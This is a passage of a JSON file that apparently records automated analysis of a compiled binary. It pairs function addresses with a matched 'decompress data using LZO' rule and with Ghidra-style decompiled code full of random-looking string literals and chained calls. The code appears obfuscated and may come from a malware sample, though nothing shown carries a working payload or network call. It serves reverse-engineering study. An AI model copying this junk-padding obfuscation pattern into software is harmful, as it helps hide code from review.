1, 0x101, 0x8f3, &var_5dh + 1, 1);\n    fcn.004b2800();\n    fcn.00483140();\n    fcn.004b2800();\n    fcn.00483140();\n    fcn.004b2800();\n    fcn.00483140();\n    return;\n}\n",
        "token_count": 2802
    },
    "004174e8": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_bp_4h\n\nvoid __fastcall fcn.004174e8(uint param_1)\n\n{\n    char *pcVar1;\n    uint *puVar2;\n    uint in_stack_fffffd58;\n    ulong uVar3;\n    uint uVar4;\n    uint uVar5;\n    uint var_1ach;\n    uint var_1a8h;\n    uint var_18dh;\n    uint var_171h;\n    uint var_155h;\n    uint var_139h;\n    uint var_11dh;\n    uint var_101h;\n    uint var_e5h;\n    uint var_cch;\n    uint var_b1h;\n    uint var_95h;\n    uint var_79h;\n    uint var_5dh;\n    uint var_41h;\n    uint var_25h;\n    uint var_9h;\n    uint var_bp_4h;\n    \n    fcn.004b2440();\n    fcn.004b2440();\n    fcn.004b2440();\n    fcn.00483110();\n    fcn.004b21e0(\"rdzpbddyzvftjajlqzlyzbvwnkkjrhqpzbenobqjoiitsfpsqytwjycuayfm\", &var_18dh);\n    fcn.00417402(*0x5227f0, *0x5227f0 >> 0x20);\n    fcn.004b2800();\n    fcn.00483140();\n    fcn.00483110();\n    fcn.004b21e0(\"wmczfksfrjejognzzjgmtzojhwozcmntie\", &var_171h);\n    fcn.00417420(*0x522800, *0x522800 >> 0x20, &var_18dh + 1, *0x5227f8, *0x5227f8 >> 0x20, 0, 1, 1);\n    fcn.004b2800();\n    fcn.00483140();\n    fcn.00483110();\n    fcn.004b21e0(0x51afb4, &var_155h);\n    fcn.00483110();\n    fcn.004b21e0(\"dubqgqqgsbzpehrkzkkgzdukrxwnhjlfzwrtlyvgtejidcibxwwjipcutggdlowdrsjrulwrgovrfeklnvwpbozouqbmsw\", \n                 &var_139h);\n    fcn.0041746a(&var_155h + 1, 0x1926, &var_171h + 1, 0, *0x522810, *0x522810 >> 0x20, 1, 0x535, *0x522808, \n                 *0x522808 >> 0x20);\n    fcn.004b2800();\n    fcn.00483140();\n    fcn.004b2800();\n    fcn.00483140();\n    fcn.0041727e(*0x522820, *0x522820 >> 0x20, 0xf8, 0xbbd, 1, 0xee, 0xb08, *0x522818, *0x522818 >> 0x20);\n    fcn.00483110();\n    fcn.004b21e0(\"iaoysnztpvexqxlizlgovzxizlyxagqe\", &var_11dh);\n    fcn.0041734a(0x833, 0x875, 1);\n    fcn.004b2800();\n    fcn.00483140();\n    uVar5 = 0x1415;\n    uVar4 = 0;\n    uVar3 = CONCAT44(0x4177ee, in_stack_fffffd58);\n    fcn.0041738a(0);\n    fcn.00483110(uVar3, uVar4, uVar5);\n    fcn.004b21e0(\"zwonifcobyxlrpdktafpzvntwpmutvhzdgfissgffjvqbzg\", &var_101h);\n    fcn.00483110();\n    fcn.004b21e0(\"olwjogdwvmqrywqtauacshcjxxnvuybwfchguudaceepcyastieuzrbqtvixrnrcdadv\", &var_e5h);\n    fcn.004160a2(&var_101h + 1, 0, 0x1c9, 0, *0x522828, *0x522828 >> 0x20);\n    fcn.004b2800();\n    fcn.00483140();\n    fcn.004b2800();\n    fcn.00483140();\n    fcn.00416146(param_1);\n    fcn.004b2800();\n    fcn.00483110();\n    puVar2 = &var_b1h;\n    pcVar1 = \"ohhhsldgbvkegriijenyvkckvikmjjdqeaikkaridtcdpwrrjvgzwldwfipsiwcoqrhybfopkiyzugwekb\";\n    fcn.004b21e0();\n    fcn.00483110();\n    fcn.004b21e0(\"dttzeiwkgnyaspsbcalsqymaqoxiigsoyqviopflzis\", &var_95h, pcVar1, puVar2);\n    fcn.00483110();\n    fcn.004b21e0(\"pimqqppsnlpahodurvfbmbewmhwqotheqwzmrixdmyowtefovnqmbhqfrzwxepgzp\", &var_79h);\n    fcn.004162e4(&var_95h + 1, 1, 0, &var_b1h + 1, 0x13f4, *0x522838, *0x522838 >> 0x20, &var_cch, 0x1fc, 0x43d, \n                 *0x522830, *0x522830 >> 0x20);\n    fcn.004b2800();\n    fcn.00483140();\n    fcn.004b2800();\n    fcn.00483140();\n    fcn.004b2800();\n    fcn.00483140();\n    fcn.004165c8(0x14d4, 0x78b, *0x522840, *0x522840 >> 0x20);\n    fcn.00416a2e(*0x522848, *0x522848 >> 0x20);\n    fcn.00483110();\n    fcn.004b21e0();\n    fcn.00483110();\n    fcn.004b21e0();\n    fcn.00416f28(0, *0x522860, *0x522860 >> 0x20, *0x522858, *0x522858 >> 0x20, 0x86d, &var_5dh + 1, 0xace, &var_79h + 1\n                 , 0, *0x522850, *0x522850 >> 0x20);\n    fcn.004b2800();\n    fcn.00483140();\n    fcn.004b2800();\n    fcn.00483140();\n    fcn.00483110();\n    fcn.004b21e0(\"qhxncfzjdhtuyhwmydqbpueugziuuwjgxjovzrhvhnngblqzgrygh\", &var_25h);\n    fcn.00483110();\n    fcn.004b21e0(\"oaacyadvkxgyzziojimhhlqglnppsecknepb\", &var_9h);\n    fcn.00416fa4(*0x522868, *0x522868 >> 0x20);\n    fcn.004b2800();\n    fcn.00483140();\n    fcn.004b2800();\n    fcn.00483140();\n    fcn.0041703e(0x254, 0x7c6, 0, 0x192, *0x522878, *0x522878 >> 0x20, *0x522870, *0x522870 >> 0x20);\n    fcn.00417070(0, 0, 0x1cad, *0x522880, *0x522880 >> 0x20, 0, 1);\n    return;\n}\n",
        "token_count": 1940
    },
    "0041b8c8": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nuint fcn.0041b8c8(void)\n\n{\n    uint var_4h;\n    \n    return 1;\n}\n",
        "token_count": 28
    },
    "0041ba22": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_bp_4h\n\nvoid __fastcall fcn.0041ba22(uint param_1)\n\n{\n    char *pcVar1;\n    uint *puVar2;\n    uint uVar3;\n    uint in_stack_fffffb7c;\n    ulong uVar4;\n    uint var_3bch;\n    uint var_3b0h;\n    uint var_395h;\n    uint var_379h;\n    uint var_35dh;\n    uint var_341h;\n    uint var_325h;\n    uint var_309h;\n    uint var_2edh;\n    uint var_2d4h;\n    uint var_2b9h;\n    uint var_29dh;\n    uint var_281h;\n    uint var_268h;\n    uint var_24dh;\n    uint var_231h;\n    uint var_215h;\n    uint var_1f9h;\n    uint var_1ddh;\n    uint var_1c1h;\n    uint var_1a5h;\n    uint var_18ch;\n    uint var_171h;\n    uint var_155h;\n    uint var_139h;\n    uint var_11dh;\n    uint var_101h;\n    uint var_e5h;\n    uint var_c9h;\n    uint var_b0h;\n    uint var_95h;\n    uint var_79h;\n    uint var_5dh;\n    uint var_41h;\n    uint var_25h;\n    uint var_9h;\n    uint var_bp_4h;\n    \n    fcn.004b2440();\n    fcn.004b2440();\n    fcn.004b2440();\n    fcn.00483110();\n    fcn.004b21e0(\"ngwoas\", &fcn.0041ba22::var_395h);\n    fcn.0041acd0(0x124a, &fcn.0041ba22::var_3b0h);\n    fcn.004b2800();\n    fcn.00483140();\n    fcn.00483110();\n    fcn.004b21e0();\n    fcn.0041ad0c(0x21f, *0x522b90, *0x522b90 >> 0x20, 0xf7d, *0x522b88, *0x522b88 >> 0x20);\n    fcn.004b2800();\n    fcn.00483140();\n    fcn.00483110();\n    fcn.004b21e0(\"pldwbiaqifnldcmjclzcovhhawmramnmvndnvfqvodpgpjpguikzkwtyczkryqzpojcqneeqarphqaugmbztbsrzekpiai\", \n                 &fcn.0041ba22::var_35dh);\n    fcn.0041adf4(1, 0, *0x522ba8, *0x522ba8 >> 0x20, *0x522ba0, *0x522ba0 >> 0x20, 0x797, *0x522b98, *0x522b98 >> 0x20, \n                 0);\n    fcn.004b2800();\n    fcn.00483140();\n    fcn.00483110();\n    fcn.004b21e0(\"apvznuyxvucdlqegxjjslcogvrqvcbttrehgansybnbujfukkgjmslyhncmehrbfjqbctgfkdevqzcvotfwrnrmzcgqrfu\", \n                 &fcn.0041ba22::var_341h);\n    fcn.00483110();\n    uVar4 = CONCAT44(0x41bc45, in_stack_fffffb7c);\n    fcn.004b21e0(\"rpripgewzpblqmfhbbronjyldbhohffxujvjimueqtvnxjkjplyllzucqycywuiqk\", &fcn.0041ba22::var_325h);\n    fcn.00483110(uVar4);\n    fcn.004b21e0(\"xgyvvvkytffaynkcryzdzgqinvniamcrzymqlmasksohirkntdginmewpaujhkzldehorixgqiyvo\", \n                 &fcn.0041ba22::var_309h);\n    fcn.00483110();\n    fcn.004b21e0(\"idhfksmvfsfeazkruvdkxdccuqidnqmejdyteknsohbcycokpsgxohyaguvcpekzmlebfojhwsvrbpaccontbafrxujxhsvdy\", \n                 &fcn.0041ba22::var_2edh);\n    fcn.0041af0c(&fcn.0041ba22::var_309h + 1, &fcn.0041ba22::var_325h + 1, &fcn.0041ba22::var_341h + 1, \n                 &fcn.0041ba22::var_35dh + 1, *0x522bb0, *0x522bb0 >> 0x20);\n    fcn.004b2800();\n    fcn.00483140();\n    fcn.004b2800();\n    fcn.00483140();\n    fcn.004b2800();\n    fcn.00483140();\n    fcn.004b2800();\n    fcn.00483140();\n    fcn.00483110();\n    fcn.004b21e0(\"eccrnaqwvkhkkgkeueiefdebggotlarvf\", &fcn.0041ba22::var_2b9h);\n    fcn.0041b15c(param_1, 0, *0x522bb8, *0x522bb8 >> 0x20, 0x12a9, &fcn.0041ba22::var_2d4h, 1, 1);\n    fcn.004b2800();\n    fcn.004b2800();\n    fcn.00483140();\n    fcn.00483110();\n    fcn.004b21e0(\"dmooncudmtdlqaawhapfuohhzeowgegpxukc\", &fcn.0041ba22::var_29dh);\n    fcn.0041b420(0xd82, 0, &fcn.0041ba22::var_2b9h + 1, 1);\n    fcn.004b2800();\n    fcn.00483140();\n    fcn.00483110();\n    fcn.004b21e0(\"gbxnemlfkunihldrhyoeumfezpfzoecllgxdaclojtxfmrplgysfpegoerujkzkzjtsswbvihpjefddwjop\", \n                 &fcn.0041ba22::var_281h);\n    fcn.0041b8c8(&fcn.0041ba22::var_29dh + 1, 0x7e0);\n    fcn.004b2800();\n    fcn.00483140();\n    fcn.00483110();\n    fcn.004b21e0(\"dqvezikkjqkuwwbinwsvcayyautfzgoxykrjgnomkcmgbqyeabpntvkjfhxr\", &fcn.0041ba22::var_24dh);\n    fcn.00483110();\n    fcn.004b21e0(\"adxyiijydhofntxzawnwkpnlfdipxqgonxovzvfxubdeulorhcdowqrbnqbshzkfxiyzdyxo\", &fcn.0041ba22::var_231h);\n    fcn.0041b8da(param_1, 0, 0, 0);\n    fcn.004b2800();\n    fcn.004b2800();\n    fcn.00483140();\n    fcn.004b2800();\n    fcn.00483140();\n    fcn.00483110();\n    uVar3 = 0x41bfee;\n    fcn.004b21e0(\"myzasnejafyjvhwymiqbuhvhxic\", &fcn.0041ba22::var_215h);\n    fcn.0041b9f4(&fcn.0041ba22::var_231h + 1, uVar3);\n    fcn.004b2800();\n    fcn.00483140();\n    fcn.00483110();\n    pcVar1 = \"swhxdvhactjvldmsjadhxlkosbkvbqq\";\n    fcn.004b21e0();\n    fcn.00483110();\n    fcn.004b21e0(\"ntfcaawbhastyagobbsfegmyysrguoshfapcuhzhgjchnhkhxvzp\", &fcn.0041ba22::var_1ddh, pcVar1);\n    fcn.0041a1a6(0x2188, 0x672, 1, *0x522bc8, *0x522bc8 >> 0x20, *0x522bc0, *0x522bc0 >> 0x20, 0x420, 0x493, \n                 &fcn.0041ba22::var_1f9h + 1, 1);\n    fcn.004b2800();\n    fcn.00483140();\n    fcn.004b2800();\n    fcn.00483140();\n    fcn.0041a32c();\n    fcn.00483110();\n    fcn.004b21e0(\"ynvaujivugcvrwkbimainpppurhjspjwfcujxfgflferajedtnvdszmtqozkwf\", &fcn.0041ba22::var_1c1h);\n    fcn.0041a57c(&fcn.0041ba22::var_1ddh + 1, 0x77b, *0x522bd8, *0x522bd8 >> 0x20, 1, 0x40c, 0, 0x63d, *0x522bd0, \n                 *0x522bd0 >> 0x20);\n    fcn.004b2800();\n    fcn.00483140();\n    fcn.00483110();\n    fcn.004b21e0(\"lxtmwbiq\", &fcn.0041ba22::var_1a5h);\n    fcn.0041a66c(0x673, &fcn.0041ba22::var_1c1h + 1, 0x1b7, *0x522be0, *0x522be0 >> 0x20);\n    fcn.004b2800();\n    fcn.00483140();\n    fcn.00483110();\n    fcn.004b21e0(\"lhsrafprpwqfxlhwwdudfftex\", &fcn.0041ba22::var_171h);\n    fcn.0041a6a6(param_1, 1, &fcn.0041ba22::var_18ch, *0x522be8, *0x522be8 >> 0x20);\n    fcn.004b2800();\n    fcn.004b2800();\n    fcn.00483140();\n    fcn.00483110();\n    pcVar1 = \"kqtlvroeolsqcolkrtxorscakotwuqmqneeooyqymmvpzubqjfio\";\n    fcn.004b21e0();\n    fcn.00483110();\n    fcn.004b21e0(\"ircefqasdweojmrdrdlcguiufgtxagcckzobzdbqsuvpox\", &fcn.0041ba22::var_139h, pcVar1);\n    fcn.00483110();\n    fcn.004b21e0(\"uxbvrwympsmtrtjmze\", &fcn.0041ba22::var_11dh);\n    fcn.0041aa18(0xf59, &fcn.0041ba22::var_139h + 1, 0, 1, &fcn.0041ba22::var_155h + 1, *0x522bf8, *0x522bf8 >> 0x20, 0\n                 , 0xc45, &fcn.0041ba22::var_171h + 1, *0x522bf0, *0x522bf0 >> 0x20);\n    fcn.004b2800();\n    fcn.00483140();\n    fcn.004b2800();\n    fcn.00483140();\n    fcn.004b2800();\n    fcn.00483140();\n    fcn.00483110();\n    puVar2 = &fcn.0041ba22::var_101h;\n    pcVar1 = \"hppwtyfskxtkqfmeltvaeghrpyhdxbatgpceqwqmuecstqi\";\n    fcn.004b21e0();\n    fcn.00483110();\n    fcn.004b21e0(\"djdmxlzboahynhjxyckqzgnqoyk\", &fcn.0041ba22::var_e5h, pcVar1, puVar2);\n    fcn.0041aa52(*0x522c08, *0x522c08 >> 0x20, &fcn.0041ba22::var_101h + 1, *0x522c00, *0x522c00 >> 0x20, \n                 &fcn.0041ba22::var_11dh + 1, 1);\n    fcn.004b2800();\n    fcn.00483140();\n    fcn.004b2800();\n    fcn.00483140();\n    fcn.00483110();\n    fcn.004b21e0(\"mgayaehxzsbpqpbue\", &fcn.0041ba22::var_c9h);\n    fcn.0041ab20(*0x522c10, *0x522c10 >> 0x20);\n    fcn.004b2800();\n    fcn.00483140();\n    fcn.00483110();\n    fcn.004b21e0(\"nuefxlxfaurxvlhkioaikjcivnvlmtdlvldkzijbndjlmigvc\", &fcn.0041ba22::var_95h);\n    fcn.0041abda(param_1, 0x1dd4, &fcn.0041ba22::var_b0h, *0x522c30, *0x522c30 >> 0x20, *0x522c28, *0x522c28 >> 0x20, \n                 *0x522c20, *0x522c20 >> 0x20, *0x522c18, *0x522c18 >> 0x20, 0xa3, 0);\n    fcn.004b2800();\n    fcn.004b2800();\n    fcn.00483140();\n    fcn.00483110();\n    fcn.004b21e0(\"fgtrpualqeqkzxozseffonssuvwbcguxnssxszdvgetbcciqvbpsfvojxrjbflescthll\", &fcn.0041ba22::var_79h);\n    fcn.00483110();\n    fcn.004b21e0(\"ohtvyskvmqouxpfubvrqeowvsracdkyjtwyswyzzgwjfyttsnftjxpweaiukijpavpdyblquhhhiecmorkt\", \n                 &fcn.0041ba22::var_5dh);\n    fcn.00483110();\n    fcn.004b21e0();\n    fcn.00419b10(&fcn.0041ba22::var_5dh + 1, *0x522c38, *0x522c38 >> 0x20);\n    fcn.004b2800();\n    fcn.00483140();\n    fcn.004b2800();\n    fcn.00483140();\n    fcn.004b2800();\n    fcn.00483140();\n    fcn.00483110();\n    fcn.004b21e0(\"itcteiswck\", &fcn.0041ba22::var_25h);\n    fcn.00419bd4(*0x522c48, *0x522c48 >> 0x20, *0x522c40, *0x522c40 >> 0x20);\n    fcn.004b2800();\n    fcn.00483140();\n    fcn.00483110();\n    fcn.004b21e0(\"ohbulixypfovwzynvmyellbofvvewkxmyxsxxyzkijdmduqdykwaqqzcxkfgageclqqmwwzkrj\", &fcn.0041ba22::var_9h);\n    fcn.00419c2c(*0x522c58, *0x522c58 >> 0x20, *0x522c50, *0x522c50 >> 0x20);\n    fcn.004b2800();\n    fcn.00483140();\n    fcn.00419db6(1, 0x5ed, *0x522c68, *0x522c68 >> 0x20, *0x522c60, *0x522c60 >> 0x20, 0, 1, 0);\n    fcn.00419ef8(*0x522c70, *0x522c70 >> 0x20, 0, 0, 0);\n    return;\n}\n",
        "token_count": 4031
    },
    "00423a1c": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_bp_4h\n\nvoid __fastcall fcn.00423a1c(uint param_1)\n\n{\n    char *pcVar1;\n    uint *puVar2;\n    ulong in_stack_fffffc78;\n    uint uVar4;\n    ulong uVar3;\n    uint var_26ch;\n    uint var_260h;\n    uint var_245h;\n    uint var_229h;\n    uint var_20dh;\n    uint var_1f1h;\n    uint var_1d5h;\n    uint var_1b9h;\n    uint var_19dh;\n    uint var_181h;\n    uint var_165h;\n    uint var_14ch;\n    uint var_131h;\n    uint var_115h;\n    uint var_fch;\n    uint var_e1h;\n    uint var_c5h;\n    uint var_a9h;\n    uint var_8dh;\n    uint var_74h;\n    uint var_59h;\n    uint var_3dh;\n    uint var_21h;\n    uint var_bp_4h;\n    \n    uVar4 = in_stack_fffffc78 >> 0x20;\n    fcn.004b2440();\n    fcn.004b2440();\n    fcn.004b2440();\n    fcn.004b2440();\n    fcn.004b2440();\n    fcn.004b2440();\n    fcn.00483110();\n    fcn.004b21e0(\"iobeqiggglrrfexsafealwtzpqgcurokehmcxrneebgrovgqqccjbcqytgncsuhqasugnbftejgvjmwwqzhuxsvwaewjojr\", \n                 &var_245h);\n    fcn.00483110();\n    fcn.004b21e0(\"psxvcvopuvjradhtffjfbxhnxqhyxlknm\", &var_229h);\n    fcn.0042321e(*0x523040, *0x523040 >> 0x20, 0, 0x1097, *0x523038, *0x523038 >> 0x20, *0x523030, *0x523030 >> 0x20, \n                 0x5ba, &var_245h + 1, 0);\n    fcn.004b2800();\n    fcn.00483140();\n    fcn.004b2800();\n    fcn.00483140();\n    fcn.00483110();\n    fcn.004b21e0(\"jyqacxgaacgaejokctjkbfxqzftljakjilwlebgijszvyxtijwqygjwtbeykkiek\", &var_20dh);\n    fcn.00483110();\n    fcn.004b21e0(\"gcoicfjdyhmxhcg\", &var_1f1h);\n    fcn.00483110();\n    puVar2 = &var_1d5h;\n    pcVar1 = \"jejlreyzizgpndlknvuwmzfzooqkoxofejaaaohtycxwgbcjftkkmezpiecyinox\";\n    fcn.004b21e0();\n    fcn.00483110();\n    fcn.004b21e0(\"xwcorutz\", &var_1b9h, pcVar1, puVar2);\n    fcn.00423534(&var_1d5h + 1, 1, 1, *0x523050, *0x523050 >> 0x20, &var_1f1h + 1, &var_20dh + 1, &var_229h + 1, 0x12d3\n                 , 0, *0x523048, *0x523048 >> 0x20);\n    fcn.004b2800();\n    fcn.00483140();\n    fcn.004b2800();\n    fcn.00483140();\n    fcn.004b2800();\n    fcn.00483140();\n    fcn.004b2800();\n    fcn.00483140();\n    fcn.00483110();\n    fcn.004b21e0(\"irlkiawolebjpwkrgrxrddktwqaqmlkubgmhhnextmxfsajyzsxgvzszegx\", &var_19dh);\n    fcn.00483110();\n    fcn.004b21e0(\"mxvsrmbftmclmwoilugouex\", &var_181h);\n    fcn.00483110();\n    fcn.004b21e0(\"ftrogboxgtufppqsoeppneatjdijbfjzoblywcisdv\", &var_165h);\n    fcn.00423666(0x349, 0, &var_181h + 1, 0, &var_19dh + 1, &var_1b9h + 1, 0xefe, 0x338, *0x523058, *0x523058 >> 0x20);\n    fcn.004b2800();\n    fcn.00483140();\n    fcn.004b2800();\n    fcn.00483140();\n    fcn.004b2800();\n    fcn.00483140();\n    fcn.00483110();\n    uVar3 = CONCAT44(uVar4, &var_131h);\n    pcVar1 = \"ohttspbzgswqcjezrxtmnvoeitazbbwiquotbapivrwocgmeh\";\n    fcn.004b21e0();\n    fcn.00483110();\n    fcn.004b21e0(\"qpdthpcivzzcxadsmuuzumfdxcsydwyeomvhdqpxexhwhxeoampmrqaue\", &var_115h, pcVar1, uVar3);\n    fcn.004238a8(param_1, 0x485, 0, *0x523068, *0x523068 >> 0x20, *0x523060, *0x523060 >> 0x20, &var_131h + 1, &var_14ch\n                 , 0);\n    fcn.004b2800();\n    fcn.004b2800();\n    fcn.00483140();\n    fcn.004b2800();\n    fcn.00483140();\n    fcn.0042394a(param_1, 0, 0);\n    fcn.004b2800();\n    fcn.00483110();\n    fcn.004b21e0(0x51face, &var_e1h);\n    fcn.0042236a(*0x523080, *0x523080 >> 0x20, 0x90, &var_fch, 0, *0x523078, *0x523078 >> 0x20, 0xce5, 0, 1, *0x523070, \n                 *0x523070 >> 0x20);\n    fcn.004b2800();\n    fcn.00483140();\n    fcn.00483110();\n    fcn.004b21e0(\"mjntwqtplkhpiy\", &var_c5h);\n    fcn.00483110();\n    fcn.004b21e0(\"ycrrcarhhoniwbhyznbhzaevgbdrblbczzhyuhc\", &var_a9h);\n    fcn.0042252a(0x8f7, 0x38c, 0xa7d, &var_c5h + 1, 0, *0x523090, *0x523090 >> 0x20, &var_e1h + 1, 1, *0x523088, \n                 *0x523088 >> 0x20);\n    fcn.004b2800();\n    fcn.00483140();\n    fcn.004b2800();\n    fcn.00483140();\n    fcn.00483110();\n    fcn.004b21e0(\"dbwiydacynatflxbmbqskyatzfmjzajkeabfycmygbyxobxeekwplznfuvfgoeuxmibikgmsjjawxfrozwxlnfoyswv\", &var_8dh\n                );\n    fcn.00422568(*0x5230a8, *0x5230a8 >> 0x20, *0x5230a0, *0x5230a0 >> 0x20, 0x9b8, 0xe38, &var_a9h + 1, 0, *0x523098, \n                 *0x523098 >> 0x20, 0x658, 1);\n    fcn.004b2800();\n    fcn.00483140();\n    fcn.004228b2(1, *0x5230c8, *0x5230c8 >> 0x20, *0x5230c0, *0x5230c0 >> 0x20, 0x110f, 1, *0x5230b8, *0x5230b8 >> 0x20\n                 , *0x5230b0, *0x5230b0 >> 0x20);\n    fcn.00422c52(param_1, *0x5230d0, *0x5230d0 >> 0x20, 0);\n    fcn.004b2800();\n    fcn.00483110();\n    puVar2 = &var_59h;\n    pcVar1 = \"pwriimcnbqueahbkirqxkoqkmugysllpqrwtzgrujqsjcndsndfzyvbplzaqculvbkxpbhiujqtwkofffpn\";\n    fcn.004b21e0();\n    fcn.00483110();\n    fcn.004b21e0(\"nevvkwqrxzgwgtwesgflwtbudxmkvuxfdomyiijrfisses\", &var_3dh, pcVar1, puVar2);\n    fcn.00483110();\n    fcn.004b21e0(\"lbjlluzbuygvhwyqilkhdllelbxqdupqoofiebkwbjonyr\", &var_21h);\n    fcn.00422d42(*0x5230f0, *0x5230f0 >> 0x20, &var_3dh + 1, &var_59h + 1, 0x86e, *0x5230e8, *0x5230e8 >> 0x20, 0, \n                 &var_74h, *0x5230e0, *0x5230e0 >> 0x20, 1, *0x5230d8, *0x5230d8 >> 0x20);\n    fcn.004b2800();\n    fcn.00483140();\n    fcn.004b2800();\n    fcn.00483140();\n    fcn.004b2800();\n    fcn.00483140();\n    fcn.00422fdc(*0x5230f8, *0x5230f8 >> 0x20, 0);\n    fcn.00423156(0x10d1);\n    fcn.00421eda(param_1);\n    fcn.004b2800();\n    fcn.0042217a(1);\n    return;\n}\n",
        "token_count": 2605
    },
    "004252d4": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_bp_4h\n\nvoid __fastcall fcn.004252d4(uint param_1)\n\n{\n    uint in_stack_fffffc68;\n    ulong uVar1;\n    uint in_stack_fffffcd8;\n    uint var_21ch;\n    uint var_218h;\n    uint var_1fdh;\n    uint var_1e1h;\n    uint var_1c8h;\n    uint var_1adh;\n    uint var_191h;\n    uint var_175h;\n    uint var_159h;\n    uint var_13dh;\n    uint var_121h;\n    uint var_105h;\n    uint var_e9h;\n    uint var_cdh;\n    uint var_b1h;\n    uint var_95h;\n    uint var_79h;\n    uint var_5dh;\n    uint var_41h;\n    uint var_25h;\n    uint var_9h;\n    uint var_bp_4h;\n    \n    fcn.00425064(1);\n    fcn.00483110();\n    fcn.004b21e0(\"vvqpncpptwdwhczlrnaktzyyffdqwxkhldenqtsbgycayspjwsim\", &var_1fdh);\n    fcn.00483110();\n    fcn.004b21e0(\"nvlbrwavfdkyvbl\", &var_1e1h);\n    fcn.004250a2(0x584, &var_1fdh + 1, &var_218h, 0x332, *0x523178, *0x523178 >> 0x20, 0, 0x64b, 1);\n    fcn.004b2800();\n    fcn.00483140();\n    fcn.004b2800();\n    fcn.00483140();\n    fcn.004250d0(*0x523180, *0x523180 >> 0x20, 1, 0, 0x18d5, 1, 1);\n    fcn.00483110();\n    fcn.004b21e0(\"pkdrhapldoy\", &var_1adh);\n    fcn.00425144(param_1, &var_1c8h);\n    fcn.004b2800();\n    fcn.004b2800();\n    fcn.00483140();\n    fcn.00424d66(1, 0x5ba, *0x523190, *0x523190 >> 0x20, 0xcb, 0x9d1, *0x523188, *0x523188 >> 0x20);\n    fcn.00424dbc(0xc03, 0xe15, 0, *0x523198, *0x523198 >> 0x20);\n    fcn.00483110();\n    fcn.004b21e0(\"epvtspmwhgkwlgwleahtiidkpslqlwrkqioydycyrhrtpbxdhhurjaoasbomulbcxlxtlnwoswztdnlpnnnksfsfb\", &var_191h)\n    ;\n    fcn.00425018(0x1164, 0x2e1, 1);\n    fcn.004b2800();\n    fcn.00483140();\n    fcn.00483110();\n    uVar1 = CONCAT44(0x4255bb, in_stack_fffffcd8);\n    fcn.004b21e0(\"amgswgswzjvplpennrwhvwnyduzfmvovnspaavdzdgyolkaprtppvqnhzjqsbk\", &var_175h);\n    fcn.00483110(uVar1);\n    fcn.004b21e0(\"iokiorficknrwpbptn\", &var_159h);\n    fcn.00483110();\n    fcn.004b21e0(\"ytfpgfpeedaeshwhfzniagzoywsaupvqxgxqfqiioeaaicawxjjpsdapgsndmochjktmgqwdeyfkyzbjjqvujnhsxdeifidlbs\", \n                 &var_13dh);\n    fcn.00483110();\n    fcn.004b21e0(\"fxakeyigrizqdkffdvcjtewqsnixlkvrpkdzvbmubyeqiomnsceccctqcvzvxccdodezgysdeujgmcj\", &var_121h);\n    fcn.00424658(&var_13dh + 1, 0x4b1, 1, 0x19da, 1, &var_159h + 1, *0x5231a8, *0x5231a8 >> 0x20, &var_175h + 1, \n                 *0x5231a0, *0x5231a0 >> 0x20);\n    fcn.004b2800();\n    fcn.00483140();\n    fcn.004b2800();\n    fcn.00483140();\n    fcn.004b2800();\n    fcn.00483140();\n    fcn.004b2800();\n    fcn.00483140();\n    fcn.00483110();\n    fcn.004b21e0(0x520110, &var_105h);\n    fcn.00483110();\n    fcn.004b21e0(\"jffhkwrmmgdifkxpwaeuvpvmxlvxcwtcsufpuotpimtkxtgdlfzxxavurstvhoupxxihkosrnrkvjtuqohhmtesxuqbqunbp\", \n                 &var_e9h);\n    fcn.00483110();\n    fcn.004b21e0(\"vpbbmtttvxrtqrcggqgokcrnbjfraijclrlcboelkoqcwtnijpjyvjknhenfefqmfafpdrjkkoppkblwysiwwv\", &var_cdh);\n    fcn.00483110();\n    fcn.004b21e0(\"obttxzlvvaeivwmvschqqfzkpbacavfvkfstotnp\", &var_b1h);\n    fcn.00483110();\n    uVar1 = CONCAT44(0x4257fe, in_stack_fffffc68);\n    fcn.004b21e0(\"vkeqhtkwymffaxgfwnyjidvrqnjzwoywsqdtrbpycjgyuqdaaotsbyomklegeyaja\", &var_95h);\n    fcn.00483110(uVar1);\n    fcn.004b21e0(\"fvqupssgeeunfrdiiwbqdchzibsxfbjmgxlcwgjuxtgjbhyjsxzmtn\", &var_79h);\n    fcn.00424918(1, &var_95h + 1, *0x5231b0, *0x5231b0 >> 0x20);\n    fcn.004b2800();\n    fcn.00483140();\n    fcn.004b2800();\n    fcn.00483140();\n    fcn.004b2800();\n    fcn.00483140();\n    fcn.004b2800();\n    fcn.00483140();\n    fcn.004b2800();\n    fcn.00483140();\n    fcn.004b2800();\n    fcn.00483140();\n    fcn.00483110();\n    fcn.004b21e0(\"wfgunmnsheivoaywzgprxkcwjbzasdajgftvinvxlgwpxnzxiks\", &var_5dh);\n    fcn.00483110();\n    fcn.004b21e0(\"lnfkbikllyavjafiooejsxkzwnwimdjtkkx\", &var_41h);\n    fcn.00424974(*0x5231d0, *0x5231d0 >> 0x20, &var_5dh + 1, 0, 1, *0x522620, *0x522620 >> 0x20, *0x5231c8, \n                 *0x5231c8 >> 0x20, &var_79h + 1, *0x5231c0, *0x5231c0 >> 0x20, *0x5231b8, *0x5231b8 >> 0x20);\n    fcn.004b2800();\n    fcn.00483140();\n    fcn.004b2800();\n    fcn.00483140();\n    fcn.00483110();\n    fcn.004b21e0(0x5202d0, &var_25h);\n    fcn.00424c66(1, 0x3b2, 0, &var_41h + 1, *0x5231e0, *0x5231e0 >> 0x20, *0x5231d8, *0x5231d8 >> 0x20);\n    fcn.004b2800();\n    fcn.00483140();\n    fcn.00483110();\n    fcn.004b21e0();\n    fcn.00424d3a(0, *0x5231e8, *0x5231e8 >> 0x20);\n    fcn.004b2800();\n    fcn.00483140();\n    return;\n}\n",
        "token_count": 2149
    },
    "0042924e": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
